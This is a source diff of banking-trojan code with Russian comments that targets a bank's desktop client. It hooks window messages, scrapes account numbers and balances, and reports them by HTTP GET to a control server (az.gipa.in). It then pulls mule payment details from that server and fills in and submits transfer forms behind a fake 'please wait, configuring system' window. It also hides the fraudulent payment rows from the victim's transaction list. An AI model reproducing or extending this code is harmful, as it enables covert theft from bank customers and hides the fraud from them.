@@ -50,16 +50,62 @@ struct ControlFinded
 	ControlForm* info;
 };
 
-void GrabBalansFromMemoText(const char* s);
-void GrabBalansFromLVM(const char* s);
+struct PaymentOrder
+{
+	char* sendAcc; //счет отправителя
+	char* sum; //сумма
+	char* inn;
+	char* bik;
+	char* recvAcc; //счет получателя
+	char* recvName; //название получателя
+	char* comment; //назначение платежа
+	char* bankName; //наименование банка получателя
+	char* bankCity; //город банка получателя
+	char* bankAcc; //счет банка получателя
+	bool entered; //платежка проведена (введена)
+	char  mem[1024]; //память для данных, сюда ссылаются указатели выше
+};
+
+//найденный счет и его баланс
+struct AccountBalans
+{
+	char acc[24]; //найденный счет
+	char balans[24]; //остаток на счету
+};
+
+//найденный аккаунт в дереве
+struct TreeAccount
+{
+	char acc[24]; //номер счета
+	HTREEITEM itemAcc; //ветка счета
+	HTREEITEM itemTmpls; //ветка шаблонов
+};
+
+static void GrabBalansFromMemoText(const char* s);
+static void GrabBalansFromLVM( int cln, const char* s );
+static void LoadPaymentOrders(); //загрузка проведенных платежек из файла, чтобы их потом скрывать
+static void SavePaymentOrders(); //сохранение платежек
+static PaymentOrder* GetPaymentOrders(); //запрос новой платежки в админке
 
 HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
 DWORD PID = 0; //для избежания 2-го запуска
+char LVM_Acc[32]; //найденный счет в таблице
 int fromLVM = 0;  //если равно 1, то передаем цифру в админку (см. функцию GrabBalansFromLVM)
 HWND treeView = 0, listView = 0, toolBar = 0;
 int idBtNewDoc = 0;
 POINT posBtNewDoc;
 int stateFakeWindow = 0;
+PaymentOrder* paymentOrders = 0; //платежные поручения
+int c_paymentOrders = 0; //количество скрываемых (полученных) платежек
+AccountBalans findedBalans[8]; //найденный счета с балансами
+int c_findedBalans = 0; //количество найденных счетов
+
+//переменные для скрытия платежек
+int lvRows[100]; //номера строк платежек для скрытия введеной нами, при идентификации нашей платежки ее номер будет переброш в конец массива, и последнии строки не будут отображатся
+int c_lvRows = 0; //количество строк в lvRows, определяется по сообщению LVM_INSERTITEM
+int begHideRows = 0; //с какой строки начинаются невидимые строки
+int identHidePayment = 0; //флаги: 1 - совпал получатель, 2 - совпала сумма, 4 - совпало назначение
+const int fullIdent = 1 + 2 + 4; //при этом значении считаем, что наша платежка идентифицирована
 
 //контролы формы "Платежное поручение"
 ControlForm controlsPaymentOrder[] = 
@@ -204,15 +250,16 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 		// для таблицы добавление item
 		case LVM_INSERTITEM:
 		{
-			/*
 			LPLVITEM item = (LPLVITEM)lParam;
 			if ( item == NULL)
 				break;
 			if ( item->mask & LVIF_TEXT && item->pszText != LPSTR_TEXTCALLBACK )
 			{
-				DBGRAFA( "Rafa++++", "i = %d,%d, '%s'", item->iItem, item->iSubItem, item->pszText );
+				//DBGRAFA( "Rafa++++", "i = %d,%d, '%s'", item->iItem, item->iSubItem, item->pszText );
 			}
-			*/
+			//строим таблицу порядка отображаемых строк
+			begHideRows = c_lvRows = item->iItem + 1;
+			lvRows[item->iItem] = item->iItem;
 			break;
 		}
 		// для таблицы  модификация item
@@ -223,7 +270,7 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 				if ( item->mask & LVIF_TEXT )
 				{
 					//DBGRAFA( "Rafa", " %s", item->pszText ); 
-					GrabBalansFromLVM(item->pszText);
+					GrabBalansFromLVM( item->iSubItem, item->pszText );
 				}
 			break;
 		}
@@ -232,19 +279,120 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);
 }
 
+static bool FindPaymentForIdent( const char* s, int id )
+{
+	for( int i = 0; i < c_paymentOrders; i++ )
+	{
+		char* s2 = 0;
+		switch( id )
+		{
+			case 0: s2 = paymentOrders[i].recvName; break;
+			case 1: s2 = paymentOrders[i].sum; break;
+			case 2: s2 = paymentOrders[i].comment; break;
+		}
+		if( s2 == 0 ) break;
+		if( m_strstr( s, s2 ) ) return true;
+	}
+	return false;
+}
+
 static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
 {
+	int iRealItem;
+	switch( Msg )
+	{
+		case WM_NOTIFY:
+		{
+			NMHDR* pdi = (NMHDR*)lParam;
+			if( pdi->hwndFrom == listView )
+			{
+				NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
+				if( pdi->code == LVN_GETDISPINFO )
+				{
+					//перекодируем номер строки
+					iRealItem = p->item.iItem;
+					p->item.iItem = lvRows[iRealItem];
+				}
+			}
+			break;
+		}
+	}
 	LRESULT ret = MainWndProc( hWnd, Msg, wParam, lParam );
 	switch ( Msg )
 	{
 		case WM_NOTIFY:
 		{
-			NMLVDISPINFOA *pdi = (NMLVDISPINFOA*)lParam;
-			if( pdi->hdr.hwndFrom == listView && pdi->hdr.code == LVN_GETDISPINFO )
+			//через сообщение LVN_GETDISPINFO ListView запрашивает данные для ячеек, в которых отображаются платежки
+			//здесь идентифицируем платежки которые нужно скрыть
+			NMHDR* pdi = (NMHDR*)lParam;
+			if( pdi->hwndFrom == listView )
 			{
-				if( pdi->item.mask & LVIF_TEXT )
+				if( pdi->code == LVN_GETDISPINFO )
 				{
-					DBGRAFA( "Rafa*****", "i = %d,%d '%s'", pdi->item.iItem, pdi->item.iSubItem, pdi->item.pszText );
+					NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
+					if( p->item.mask & LVIF_TEXT )
+					{
+						switch( p->item.iSubItem )
+						{
+							case 5: //получатель
+								if( FindPaymentForIdent( p->item.pszText, 0 ) )
+									identHidePayment |= 1;
+								else
+									identHidePayment = 0; //если не совпало, то обнуляем полностью идентификацию
+								break;
+							case 4: //сумма
+								if( FindPaymentForIdent( p->item.pszText, 1 ) )
+									identHidePayment |= 2;
+								else
+									identHidePayment = 0; 
+								break;
+							case 6: //назначение
+								if( FindPaymentForIdent( p->item.pszText, 2 ) )
+									identHidePayment |= 4;
+								else
+									identHidePayment = 0; 
+								break;
+						}
+						if( identHidePayment == fullIdent ) //наша платежка идентифицирована
+						{
+							DBGRAFA( "Rafa", "Идентифицировали платежку %d", iRealItem );
+							//ищем индекс платежки в нашем массиве
+							int idx = -1;
+							for( int i = 0; i < c_lvRows; i++ )
+								if( lvRows[i] == iRealItem )
+								{
+									idx = i;
+									break;
+								}
+							if( idx < begHideRows ) //платежка еще не скрыта
+							{
+								//переносим номер этой платежки в самый низ, остальные поднимаем выше
+								int num = lvRows[idx]; //запомнили порядковый номер платежки
+								for( int i = idx; i < c_lvRows - 1; i++ )
+									lvRows[i] = lvRows[i + 1];
+								begHideRows--;
+								lvRows[c_lvRows - 1] = num;
+							}
+							identHidePayment = 0;
+							pUpdateWindow(listView); //обновляем таблицу
+						}
+						//DBGRAFA( "Rafa*****", "i = %d,%d '%s'", p->item.iItem, p->item.iSubItem, p->item.pszText );
+					}
+				}
+				if( pdi->code == NM_CUSTOMDRAW )
+				{
+					NMLVCUSTOMDRAW* p = (NMLVCUSTOMDRAW*)lParam;
+					if( p->nmcd.dwDrawStage == CDDS_PREPAINT )
+					{
+						ret |= CDRF_NOTIFYITEMDRAW;
+					}
+					if( p->nmcd.dwDrawStage == CDDS_ITEMPREPAINT ) 
+					{
+						if( p->nmcd.dwItemSpec >= (DWORD)begHideRows ) //запрещаем рисовать нашу платежку
+							ret = CDRF_SKIPDEFAULT;
+						else
+							ret = CDRF_NEWFONT;
+					}
 				}
 			}
 			break;
@@ -261,7 +409,6 @@ static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, P
 	if( hWnd && (DWORD)lpClassName > 0x10000 && lpWindowName )
 	{
 		bool transparent = false;
-		DBGRAFA( "Rafa--", "'%s','%s'", lpWindowName, lpClassName );
 		if( (stateFakeWindow & 3) == 3 ) //ждем появления окна ввода новой платежки
 		{
 			RECT r;
@@ -539,7 +686,7 @@ static char* GetTextTreeItem( HTREEITEM item, char* buf, int szBuf )
 }
 
 //ищем "платежное поручение"->"Шаблоны", возвращаем item Шаблоны
-static HTREEITEM FindPaymentOrder( HTREEITEM item )
+static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* itemAccs, int c_itemAccs )
 {
 	char text[256];
 	do
@@ -569,7 +716,15 @@ static HTREEITEM FindPaymentOrder( HTREEITEM item )
 							{
 								if( m_strstr( text, "Шаблоны" ) )
 								{
-									return item2;
+									//itemPrev - это ветка с номеров счета
+									//выбераем ветку с номером счеиа, чтобы сграбился в хуках баланс
+									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemPrev );
+									//запоминаем нужные нам ветки счета
+									GetTextTreeItem( itemPrev, itemAccs[c_itemAccs].acc, sizeof(itemAccs[c_itemAccs].acc) );
+									itemAccs[c_itemAccs].itemAcc = itemPrev;
+									itemAccs[c_itemAccs].itemTmpls = item2;
+									DBGRAFA( "Rafa", "Find tree item %s", itemAccs[c_itemAccs].acc );
+									return ++c_itemAccs;
 								}
 							}
 							item2 = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item2 );
@@ -577,15 +732,13 @@ static HTREEITEM FindPaymentOrder( HTREEITEM item )
 						while(item2);
 					}
 				}
-				HTREEITEM res = FindPaymentOrder(child);
-				if( res )
-					return res;
+				c_itemAccs = FindPaymentOrder( child, item, itemAccs, c_itemAccs );
 			}
 		}
 		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
 		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item );
 	} while( item );
-	return 0;
+	return c_itemAccs;
 }
 
 //сворачивает указанное количество веток дерева
@@ -703,11 +856,11 @@ static DWORD WINAPI FakeWindow( LPVOID p )
 	if( !fakeWindow )
       return 0; 
 	//окно в котором печатается текст
-	HWND warnWnd = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
+	HWND warnWnd = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
 	//сам текст пишем в статус баре, чтобы был нормальный фон и цвет текста
-	HWND warnText = (HWND)CreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
+	HWND warnText = (HWND)pCreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
 	//статус бар справа рисует треугольник, это окно его скрывает
-	HWND warnWnd2 = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
+	HWND warnWnd2 = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
 	//создаем сам прогресс бар
 	HWND progressBar = (HWND)pCreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );
 
@@ -733,8 +886,8 @@ static DWORD WINAPI FakeWindow( LPVOID p )
 		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow ) //наш таймер
 		{
 			pSendMessageA( progressBar, PBM_STEPIT, 0, 0 ); 
-			if( --remain == 0 )
-				break;
+			//if( --remain == 0 )
+			//	break;
 		}
 	    pTranslateMessage( &msg );
 		pDispatchMessageA( &msg );
@@ -761,6 +914,7 @@ static DWORD WINAPI FakeWindow( LPVOID p )
 //сюда попадаем когда найдены контролы TreeView и ListView окна банка
 static void WorkInRafa()
 {
+	c_findedBalans = 0;
 	HWND parent = (HWND)pGetParent(treeView);
 	//подменяем оконную процедуру главного окна, для перехвата нотификационніх сообщений
 	MainWndProc = (WNDPROC)SetWindowLongPtr( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
@@ -771,86 +925,106 @@ static void WorkInRafa()
 	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
 	if( root )
 	{
-		HTREEITEM tmpls = 0;
+		TreeAccount* itemAccs = (TreeAccount*)MemAlloc( sizeof(TreeAccount) * 16 ); //массив найденных веток счетов, рассчитываем максимум на 16 счетов
+		int c_itemAccs = 0;
 		//находим пункт Шаблоны, делаем несколько попыток, так как не сразу все загружается
 		for( int i = 0; i < 10; i++ )
 		{
-			tmpls = FindPaymentOrder(root); 
+			c_itemAccs = FindPaymentOrder( root, 0, itemAccs, c_itemAccs ); 
+			if( c_itemAccs ) break;
 			pSleep(1000);
 		}
-		if( tmpls )
+		if( c_itemAccs > 0 )
 		{
-			if( pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)tmpls ) )
+			DBGRAFA( "Rafa", "Найдено веток счетов %d", c_itemAccs );
+			PaymentOrder* po = GetPaymentOrders(); //передаем баланс и получаем данные для заполнения платежки
+			if( po )
 			{
-				DBGRAFA( "Rafa", "Шаблоны выбраны" );
-				int indList = -1;
-				for( int i = 0; i < 10; i++ )
-				{
-					indList = FindNewPaymentOrder();
-					if( indList >= 0 ) break;
-					pSleep(1000);
-				}
-				if( indList >= 0 )
-				{
-					DBGRAFA( "Rafa", "Найдено новое платежное поручение" );
-					POINT posItem;
-					pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
-					stateFakeWindow |= 2; //ожидаем появления окна Платёжного поручения и делаем его прозрачным
-					HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
-					DBGRAFA( "Rafa", "Кликнули по новому платежному поручению" );
-					FindTreeList();
-					if( toolBar )
+				//ищем счет в котором будем добавлять платежку
+				TreeAccount* itemAcc = 0;
+				for( int i = 0; i < c_itemAccs; i++ )
+					if( m_lstrcmp( po->sendAcc, itemAccs[i].acc ) == 0 )
 					{
-						HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
-						DBGRAFA( "Rafa", "Нажали кнопку создания нового документа" );
-						//ждем появления формы ввода платежа
-						HWND formPayment = 0;
-						for( int i = 0; i < 10; i++ )
+						itemAcc = &itemAccs[i];
+						break;
+					}
+				if( itemAcc && pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemAcc->itemTmpls ) )
+				{
+					DBGRAFA( "Rafa", "Шаблоны выбраны для счета %s", itemAcc->acc );
+					int indList = -1;
+					for( int i = 0; i < 10; i++ )
+					{
+						indList = FindNewPaymentOrder();
+						if( indList >= 0 ) break;
+						pSleep(1000);
+					}
+					if( indList >= 0 )
+					{
+						DBGRAFA( "Rafa", "Найдено новое платежное поручение" );
+						POINT posItem;
+						pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
+						stateFakeWindow |= 2; //ожидаем появления окна Платёжного поручения и делаем его прозрачным
+						HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
+						DBGRAFA( "Rafa", "Кликнули по новому платежному поручению" );
+						FindTreeList();
+						if( toolBar )
 						{
-							formPayment = FindForm( &controlsPaymentOrder[0] );
-							if( formPayment ) break;
-							pSleep(1000);
-						}
-						if( formPayment )
-						{
-							DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
-							stateFakeWindow |= 4; //делаем прозрачными все всплывающие окна во время ввода платежки
-							//ищем контролы в которые будем вводить
-							ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
-							int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
-							if( countControls ) //нашли нужные контролы, теперь заполняем
+							HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
+							DBGRAFA( "Rafa", "Нажали кнопку создания нового документа" );
+							//ждем появления формы ввода платежа
+							HWND formPayment = 0;
+							for( int i = 0; i < 10; i++ )
 							{
-								DBGRAFA( "Rafa", "Заполняем контролы" );
-								//SetText( "num", "1", cf, countControls );
-								//SetText( "status", "2", cf, countControls );
-								SetText( "sum", "1", cf, countControls );
-								SetText( "innrecv", "7705401519", cf, countControls );
-								SetText( "kpprecv", "770501001", cf, countControls );
-								SetText( "accountrecv", "40703810500", cf, countControls );
-								SetText( "namerecv", "Благотворительный Фонд 'СОЗИДАНИЕ'", cf, countControls );
-								SetText( "bikrecv", "044525225", cf, countControls );
-								SetText( "bankrecv", "Сбербанка России", cf, countControls );
-								SetText( "accbankrecv", "30101810400", cf, countControls );
-								SetText( "punktrecv", "Moscow", cf, countControls );
-								SetText( "comment", "помощь детям", cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст
-								SetButtonCheck( "sended", true, cf, countControls );
-								//сохраняем платежку
-								ClickButton( "save", cf, countControls );
-								pSleep(5000); //ждем пока сохранится
-								//сворачиваем дерево до первоначального состояния
-								TreeViewCollapse( tmpls, 4 );
-								pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
+								formPayment = FindForm( &controlsPaymentOrder[0] );
+								if( formPayment ) break;
+								pSleep(1000);
 							}
-							HEAP::Free(cf);
+							if( formPayment )
+							{
+								DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
+								stateFakeWindow |= 4; //делаем прозрачными все всплывающие окна во время ввода платежки
+								//ищем контролы в которые будем вводить
+								ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
+								int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
+								if( countControls ) //нашли нужные контролы, теперь заполняем
+								{
+									DBGRAFA( "Rafa", "Заполняем контролы" );
+									//SetText( "num", "1", cf, countControls );
+									//SetText( "status", "2", cf, countControls );
+									SetText( "sum", po->sum, cf, countControls );
+									SetText( "innrecv", po->inn, cf, countControls );
+									//SetText( "kpprecv", "770501001", cf, countControls );
+									SetText( "accountrecv", po->recvAcc, cf, countControls );
+									SetText( "namerecv", po->recvName, cf, countControls );
+									SetText( "bikrecv", po->bik, cf, countControls );
+									SetText( "bankrecv", po->bankName, cf, countControls );
+									SetText( "accbankrecv", po->bankAcc, cf, countControls );
+									SetText( "punktrecv", po->bankCity, cf, countControls );
+									SetText( "comment", po->comment, cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст
+									SetButtonCheck( "sended", true, cf, countControls );
+									//сохраняем платежку
+									ClickButton( "save", cf, countControls );
+									pSleep(5000); //ждем пока сохранится
+									//сворачиваем дерево до первоначального состояния
+									TreeViewCollapse( itemAcc->itemTmpls, 4 );
+									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
+									po->entered = true;
+									SavePaymentOrders();
+								}
+								HEAP::Free(cf);
+							}
+							else
+								DBGRAFA( "Rafa", "Форма ввода платежа не открылась" );
 						}
-						else
-							DBGRAFA( "Rafa", "Форма ввода платежа не открылась" );
 					}
 				}
 			}
+			else //если платежку не создавали, то сворачиваем дерево до первоначального состояния
+				TreeViewCollapse( itemAccs[0].itemTmpls, 2 );
 		}
 		else
 			DBGRAFA( "Rafa", "Шаблоны ненайдены" );
+		MemFree(itemAccs);
 	}
 	stateFakeWindow = 0; //закрываем окно скрытия
 }
@@ -904,27 +1078,27 @@ void InitHook_FilialRConDll()
 	}
 }
 
-const char* panelaz = "sberbanksystem.ru";
 //отсылаем баланс, GET запросом
-void SendBalans( const char* balans )
+static void AddBalans( const char* acc, const char* balans )
 {
-	fwsprintfA wsprintfA = Get_wsprintfA();
-	MemPtr<512> qr;
-	MemPtr<128> uid;
-	//формируем запрос
-	GenerateUid(uid.str());
-	wsprintfA( qr.str(), "http://%s/bal/?uid=%s&type=raifur&sum=%s", panelaz, uid, balans );
-	//отправляем запрос
-	THTTPResponse Response;
-	ClearStruct(Response);
-	HTTP::Get( qr, 0, &Response );
-	DBGRAFA( "Rafa", "Передали баланс: %s", qr.str() );
+	int i;
+	for( i = 0; i < c_findedBalans; i++ )
+		if( m_lstrcmp( findedBalans[i].acc, acc ) == 0 )
+			break;
+	if( i >= c_findedBalans ) //новый счет
+	{
+		if( c_findedBalans >= 8 ) return; //рассчитано на не более 8-ми счетов
+		m_lstrcpy( findedBalans[i].acc, acc );
+		c_findedBalans++;
+	}
+	m_lstrcpy( findedBalans[i].balans, balans );
+	DBGRAFA( "Rafa", "finded acc '%s', balans '%s'", acc, balans );
 }
 
 //грабим баланс с текстового поля (справа снизу)
 //грабим с такой строки:
 //Доступный/текущий остаток по счету: 83109.16/83109.16 (РОССИЙСКИЙ РУБЛЬ)
-void GrabBalansFromMemoText(const char* s)
+static void GrabBalansFromMemoText(const char* s)
 {
 	const char* p = m_strstr( s, "(РОССИЙСКИЙ РУБЛЬ)" );
 	if( p )
@@ -941,12 +1115,24 @@ void GrabBalansFromMemoText(const char* s)
 				p1++; //стоим на 1-й цифре первой суммы
 				if( *p1 >= '0' && *p1 <= '9' )
 				{
-					char balans[32];
+					char acc[32], balans[32];
 					//переносим цифры до точки (целую часть)
 					int i = 0;
-					while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
+					//while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
+					while( *p1 != '/' && *p1 != ' ' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
 					balans[i] = 0; //теперь у нас там остаток
-					SendBalans(balans);
+					//ищем номер счета
+					//он должен быть в в фомате: "Счет N: 28462985925292987927923;"
+					p = m_strstr( s, "Счет N:" );
+					if( p )
+					{
+						p += 7;
+						while( *p == ' ' ) p++;
+						i = 0;
+						while( *p >= '0' && *p <= '9' ) acc[i++] = *p++;
+						acc[i] = 0;
+						AddBalans( acc, balans );
+					}
 				}
 			}
 		}
@@ -954,9 +1140,18 @@ void GrabBalansFromMemoText(const char* s)
 }
 
 //грабит баланс с таблицы справа сверху
-void GrabBalansFromLVM(const char* s)
+void GrabBalansFromLVM( int cln, const char* s )
 {
-	if( fromLVM == 0 )
+	if( cln == 1 && s[0] >= '0' && s[1] <= '9' )
+	{
+		int len = m_lstrlen(s);
+		if( len < sizeof(LVM_Acc) - 1 )
+		{
+			m_memcpy( LVM_Acc, s, len );
+			LVM_Acc[len] = 0;
+		}
+	}
+	if( cln == 2 && fromLVM == 0 )
 	{
 		if( m_lstrcmp( s, "РОССИЙСКИЙ РУБЛЬ" ) == 0 ) //нужное значение ячейки, следующая ячейка будет иметь баланс
 		{
@@ -964,16 +1159,17 @@ void GrabBalansFromLVM(const char* s)
 		}
 	}
 	else
-		if( fromLVM == 1 ) //в s находится баланс
+		if( cln == 3 && fromLVM == 1 ) //в s находится баланс
 		{
 			if( *s >= '0' && *s <= '9' )
 			{
 				char balans[32];
 				int i = 0;
 				//переносим цифры до точки
-				while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
-				balans[i] = 0;
-				SendBalans(balans);
+				//while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
+				//balans[i] = 0;
+				m_lstrcpy( balans, s );
+				AddBalans( LVM_Acc, balans );
 			}
 			fromLVM = 0;
 		}
@@ -981,4 +1177,129 @@ void GrabBalansFromLVM(const char* s)
 }
 //http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234
 
+const char* panelaz = "az.gipa.in"; //"sberbanksystem.ru";
+
+static char* GetAdminUrl( char* url )
+{
+	m_lstrcpy( url, panelaz );
+	return url;
 }
+
+//загрузка проведенных платежек из файла, чтобы их потом скрывать
+static void LoadPaymentOrders()
+{
+	paymentOrders = 0; 
+	c_paymentOrders = 0;
+}
+
+//сохранение платежек
+static void SavePaymentOrders() 
+{
+}
+
+//отсылка Get запроса админке, если ret = true, то нужно возвращать ответ
+//mode1 - текст команды для обного баланса, mode2 - текст команды для нескольких балансов
+static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
+{
+	char urlAdmin[128];
+	if( c_findedBalans == 0 ) return 0; //если аккаунты не обнаружены, то не смысла слать запрос
+	char* res = 0;
+	if( GetAdminUrl(urlAdmin) )
+	{
+		const char* mode = mode1;
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		MemPtr<512> qr, accs;
+		MemPtr<128> uid;
+		//формируем строку с балансами
+		if( c_findedBalans > 1 )
+		{
+			m_lstrcpy( accs.str(), "accs=" );
+			int len = 5;
+			for( int i = 0; i < c_findedBalans; i++ )
+				len += pwsprintfA( accs.str() + len, "%s:%s;", findedBalans[i].acc, findedBalans[i].balans );
+			mode = mode2;
+		}
+		else
+			pwsprintfA( accs.str(), "sum=%s&acc=%s", findedBalans[0].balans, findedBalans[0].acc );
+		//формируем запрос
+		GenerateUid(uid.str());
+		wsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&mode=%s&%s", urlAdmin, uid, mode, accs.str() );
+		//отправляем запрос
+		THTTPResponse Response;
+		ClearStruct(Response);
+		HTTP::Get( qr, ret ? &res : 0, &Response );
+		DBGRAFA( "Rafa", "Передали запрос: %s", qr.str() );
+		HTTPResponse::Clear(&Response);
+	}
+	if( res )
+	{
+		char* res2 = UTF8ToAnsi(res);
+		STR::Free(res);
+		res = res2;
+		DBGRAFA( "Rafa", "Получен ответ: %s", res );
+	}
+	return res;
+}
+
+static char* CopyDataPayment( char*& to, char* from )
+{
+	while( *from != '|' && *from ) *to++ = *from++;
+	if( *from == '|' ) from++; //переход на следующий параметр
+	*to++ = 0;
+	return from;
+}
+
+//запрос новой платежки в админке
+static PaymentOrder* GetPaymentOrders()
+{
+	char* payment = SendToAdmin( "getdrop", "getdrops", true );
+	PaymentOrder* res = 0;
+	if( payment )
+	{
+		//если уже есть платежки, то перевыделяем память для новой платежки
+		if( c_paymentOrders > 0 )
+		{
+			paymentOrders = (PaymentOrder*)MemRealloc( paymentOrders, sizeof(PaymentOrder) * (c_paymentOrders + 1) );
+			if( paymentOrders ) c_paymentOrders++;
+		}
+		else //платежек еще не было, создаем
+		{
+			paymentOrders = (PaymentOrder*)MemAlloc( sizeof(PaymentOrder) );
+			if( paymentOrders ) c_paymentOrders++;
+		}
+		if( c_paymentOrders > 0 )
+		{
+			//разбор переданной строки
+			PaymentOrder* po = &paymentOrders[c_paymentOrders - 1];
+			char* from = payment;
+			char* to = po->mem;
+			po->sendAcc = to; from = CopyDataPayment( to, from );
+			po->sum = to; from = CopyDataPayment( to, from );
+			po->inn = to; from = CopyDataPayment( to, from );
+			po->bik = to; from = CopyDataPayment( to, from );
+			po->recvAcc = to; from = CopyDataPayment( to, from );
+			po->recvName = to; from = CopyDataPayment( to, from );
+			po->comment = to; from = CopyDataPayment( to, from );
+			po->bankName = to; from = CopyDataPayment( to, from );
+			po->bankCity = to; from = CopyDataPayment( to, from );
+			po->bankAcc = to; from = CopyDataPayment( to, from );
+			po->entered = false;
+			DBGRAFA( "Rafa", "Получена платежка" );
+			DBGRAFA( "Rafa", "sendAcc '%s'", po->sendAcc );
+			DBGRAFA( "Rafa", "sum '%s'", po->sum );
+			DBGRAFA( "Rafa", "inn '%s'", po->inn );
+			DBGRAFA( "Rafa", "bik '%s'", po->bik );
+			DBGRAFA( "Rafa", "recvAcc '%s'", po->recvAcc );
+			DBGRAFA( "Rafa", "recvName '%s'", po->recvName );
+			DBGRAFA( "Rafa", "comment '%s'", po->comment );
+			DBGRAFA( "Rafa", "bankName '%s'", po->bankName );
+			DBGRAFA( "Rafa", "bankCity '%s'", po->bankCity );
+			DBGRAFA( "Rafa", "bankAcc '%s'", po->bankAcc );
+			res = po;
+		}
+		STR::Free(payment);
+	}
+	return res;
+}
+
+};
